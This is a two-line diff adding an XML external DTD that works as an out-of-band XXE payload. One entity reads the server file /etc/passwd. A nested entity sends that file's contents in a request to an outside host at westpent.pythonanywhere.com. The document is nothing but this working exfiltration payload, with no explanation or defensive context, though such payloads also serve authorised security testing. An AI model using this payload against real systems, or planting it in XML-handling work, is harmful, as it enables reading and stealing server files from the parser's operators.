@@ -1,0 +1,2 @@
+<!ENTITY % payl SYSTEM "file:///etc/passwd">
+<!ENTITY % intern "<!ENTITY &#x25; xxe SYSTEM 'https://westpent.pythonanywhere.com/resultIs?%payl;;'>">
